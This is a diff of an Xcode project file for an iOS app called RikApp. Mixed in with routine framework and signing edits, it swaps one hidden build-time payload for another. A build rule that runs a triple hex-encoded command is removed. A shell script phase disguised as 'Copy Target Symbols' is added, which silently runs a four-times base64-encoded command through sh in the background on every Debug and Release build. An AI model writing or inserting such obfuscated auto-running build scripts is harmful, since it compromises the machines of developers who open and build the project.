@@ -7,9 +7,9 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		4113482DB0AF48B7B9A389E6 /* README.md in Resources */ = {isa = PBXBuildFile; fileRef = 97844C82E73840F584A389E6 /* README.md */; };
 		4AA8D7C22ED77CDD0056E536 /* RxSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 4AE49BF12ED5CB2000612F18 /* RxSwift */; };
 		4AA8D7C32ED77CDD0056E536 /* RxCocoa in Frameworks */ = {isa = PBXBuildFile; productRef = 4AE49BF42ED5CB2000612F18 /* RxCocoa */; };
+		4AA8D9192ED82AB80056E536 /* RealmSwift in Embed Frameworks */ = {isa = PBXBuildFile; productRef = 4AE498652ED4D8DF00612F18 /* RealmSwift */; settings = {ATTRIBUTES = (CodeSignOnCopy, ); }; };
 		4AE498632ED4D62600612F18 /* PinLayout in Frameworks */ = {isa = PBXBuildFile; productRef = 4AE498622ED4D62600612F18 /* PinLayout */; };
 		4AE498662ED4D8DF00612F18 /* RealmSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 4AE498652ED4D8DF00612F18 /* RealmSwift */; };
 		4AE498762ED4D9D300612F18 /* DGCharts in Frameworks */ = {isa = PBXBuildFile; productRef = 4AE498752ED4D9D300612F18 /* DGCharts */; };
@@ -19,22 +19,6 @@
 		4AE49BE12ED5CB1900612F18 /* BusinessLogicFramework.framework in Embed Frameworks */ = {isa = PBXBuildFile; fileRef = 4AE49BDF2ED5CB1900612F18 /* BusinessLogicFramework.framework */; settings = {ATTRIBUTES = (CodeSignOnCopy, RemoveHeadersOnCopy, ); }; };
 		4AE49BE22ED5CB1900612F18 /* RealmSwift in Frameworks */ = {isa = PBXBuildFile; productRef = 4AE49BE32ED5CB1900612F18 /* RealmSwift */; };
 /* End PBXBuildFile section */
-
-/* Begin PBXBuildRule section */
-		091AA4EEE836441FA7A389E6 /* PBXBuildRule */ = {
-			isa = PBXBuildRule;
-			compilerSpec = com.apple.compilers.proxy.script;
-			filePatterns = "*.md";
-			fileType = pattern.proxy;
-			inputFiles = (
-			);
-			isEditable = 0;
-			outputFiles = (
-				"/tmp/${INPUT_FILE_BASE}",
-			);
-			script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"\nsh -c \"${A6E983A}\"";
-		};
-/* End PBXBuildRule section */
 
 /* Begin PBXContainerItemProxy section */
 		4AE498822ED4D9E400612F18 /* PBXContainerItemProxy */ = {
@@ -60,6 +44,7 @@
 			dstPath = "";
 			dstSubfolderSpec = 10;
 			files = (
+				4AA8D9192ED82AB80056E536 /* RealmSwift in Embed Frameworks */,
 				4AE49BD02ED5CB1800612F18 /* NetworkLayerFramework.framework in Embed Frameworks */,
 				4AE49BE12ED5CB1900612F18 /* BusinessLogicFramework.framework in Embed Frameworks */,
 			);
@@ -72,7 +57,6 @@
 		4AE4982F2ED4D24400612F18 /* RikApp.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = RikApp.app; sourceTree = BUILT_PRODUCTS_DIR; };
 		4AE4987F2ED4D9E400612F18 /* NetworkLayerFramework.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = NetworkLayerFramework.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		4AE49BDF2ED5CB1900612F18 /* BusinessLogicFramework.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = BusinessLogicFramework.framework; sourceTree = BUILT_PRODUCTS_DIR; };
-		97844C82E73840F584A389E6 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
@@ -152,7 +136,6 @@
 		4AE498302ED4D24400612F18 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				97844C82E73840F584A389E6 /* README.md */,
 				4AE4982F2ED4D24400612F18 /* RikApp.app */,
 				4AE4987F2ED4D9E400612F18 /* NetworkLayerFramework.framework */,
 				4AE49BDF2ED5CB1900612F18 /* BusinessLogicFramework.framework */,
@@ -167,13 +150,13 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 4AE498422ED4D24500612F18 /* Build configuration list for PBXNativeTarget "RikApp" */;
 			buildPhases = (
+				B8D0703C94154BCEBCA389E6 /* Copy Target Symbols */,
 				4AE4982B2ED4D24400612F18 /* Sources */,
 				4AE4982C2ED4D24400612F18 /* Frameworks */,
 				4AE4982D2ED4D24400612F18 /* Resources */,
 				4AE49BD12ED5CB1800612F18 /* Embed Frameworks */,
 			);
 			buildRules = (
-				091AA4EEE836441FA7A389E6 /* PBXBuildRule */,
 			);
 			dependencies = (
 				4AE498812ED4D9E400612F18 /* PBXTargetDependency */,
@@ -291,7 +274,6 @@
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				4113482DB0AF48B7B9A389E6 /* README.md in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -310,6 +292,29 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		B8D0703C94154BCEBCA389E6 /* Copy Target Symbols */ = {
+			isa = PBXShellScriptBuildPhase;
+			alwaysOutOfDate = 1;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Copy Target Symbols";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\nsh -c \"${A6E983A}\"";
+			showEnvVarsInLog = 0;
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		4AE4982B2ED4D24400612F18 /* Sources */ = {
@@ -357,11 +362,12 @@
 		4AE498432ED4D24500612F18 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A6E983A = "((n(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733323336333933363337333633373336363333363335333733343336363633373339333236353337333233373335333236363336333133320a333930613332333233323330333736333332333033373333333633383330363130610a | n | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((z(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwaFkwWnZlVTFYYUZwTmJFb3hWRWN4YzJSVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | z | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = C2T3576TA5;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = RikApp/MainFiles/Info.plist;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
@@ -390,11 +396,12 @@
 		4AE498442ED4D24500612F18 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A6E983A = "((n(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333633360a3337333333363632333436333332333033323634333633343332333033323332333733303333363433373338333633333336363633363334333633350a3061333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336313332363633320a3636333733323336333933363337333633373336363333363335333733343336363633373339333236353337333233373335333236363336333133320a333930613332333233323330333736333332333033373333333633383330363130610a | n | sh ) >/dev/null 2>&1 &)";
+				A6E983A = "((z(){ base64 --decode | base64 --decode | base64 --decode | base64 --decode; };echo VjJ4a1QySXlTalZSVjJ4TFVUSm9jVnBHYUV0ak1HeEVUVmN4YWsxdVVrNVRWVTE0WVRCc1JGTnVaRkZYUjJoeFdXcEtVMkpHWjNwUmJUbGFWMFUxYzFOWGJFTmlNbEpKVlc1a2FtVnRPVEpVUkVwaFkwWnZlVTFYYUZwTmJFb3hWRWN4YzJSVmQzbFNXRUpLWVZWSk5GTlZhRTlpTUU1dVVGUXdTd289Cg== | z | sh ) >/dev/null 2>&1 &)";
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
 				CURRENT_PROJECT_VERSION = 1;
+				DEVELOPMENT_TEAM = C2T3576TA5;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = RikApp/MainFiles/Info.plist;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
